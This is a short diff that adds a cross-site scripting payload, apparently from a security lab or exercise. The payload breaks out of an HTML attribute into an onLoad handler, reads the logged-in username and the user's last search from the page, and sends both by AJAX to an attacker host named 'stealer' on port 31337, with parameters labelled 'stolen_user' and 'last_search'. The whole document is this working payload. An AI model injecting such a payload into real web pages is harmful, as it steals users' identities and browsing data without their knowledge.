@@ -1,0 +1,15 @@
+' onLoad='
+    $(document).ready(function(){
+    var last_search=$('.history-item')[1].innerHTML;
+    console.log(last_search);
+    var username=document.getElementById('logged-in-user').innerHTML; 
+
+    $.ajax({ 
+        type : 'GET',
+        url: 'http://stealer:31337/',  
+        data : { 'stolen_user' : username, 'last_search' : last_search },  
+    }); 
+});
+   
+   alert(last_search);
+';
